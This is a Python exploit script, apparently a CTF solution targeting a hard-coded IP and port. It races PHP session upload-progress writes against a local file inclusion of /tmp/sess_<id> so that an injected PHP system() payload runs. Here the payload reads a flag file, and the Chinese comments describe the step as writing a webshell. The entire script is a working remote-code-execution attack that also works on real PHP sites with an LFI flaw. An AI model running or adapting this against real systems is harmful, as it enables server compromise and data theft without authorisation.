# -*- coding: utf-8 -*-
# @Author: k1he
# @Date:   2021-09-20 09:51:29
# @Last Modified by:   k1he
# @Last Modified time: 2021-09-20 14:33:23
import io
import requests
import threading

sessid = 'k1he'
url = 'http://1.14.71.254:28086/'

def write(session):
    while event.isSet():
        f = io.BytesIO(b'a'* 1024 * 50)                     #创建文件
        response = session.post(                            #post文件上传
            url,                                            #url
            cookies = {'PHPSESSID':sessid},                   #设置cookie为我们的sessid
            data = { "PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat /nssctfasdasdfla*');?>"},#写马或执行内容
            files = {"file":('k1he.txt',f)}                 #上传文的具体内容，文件名和文件内容
            )

def read(session):
    while event.isSet():
        payload = "?file=/tmp/sess_"+sessid                 #包含我们的session路径

        response = session.get(url = url+payload)           #读取页面

        if 'k1he.txt' in response.text:                     #返回页面
            print(response.text)
            event.clear()
        else:
            print("[*]retrying!!!")


if __name__ == '__main__':                                  #双线程运行
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()


